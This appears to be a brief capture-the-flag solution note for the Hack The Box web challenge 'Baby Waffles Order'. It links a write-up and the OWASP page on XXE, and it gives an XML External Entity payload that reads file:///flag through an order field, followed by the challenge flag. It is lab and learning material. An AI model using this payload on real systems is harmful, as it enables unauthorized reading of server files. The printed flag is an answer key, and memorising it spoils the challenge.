#https://nxtdaemon.xyz/htb-baby-waffles-order-web/?utm_source=rss&utm_medium=rss&utm_campaign=htb-baby-waffles-order-web
#Insomnia or Postman

#XML External Entity (XXE) Processing
#https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

'''
<!-- ?xml version="1.0" ?-->
<!DOCTYPE replace [ <!ENTITY Flag SYSTEM "file:///flag" > ]>
<order>
           <food>&Flag;</food>
</order>
'''

#HTB{who_let_the_xxe_out??}
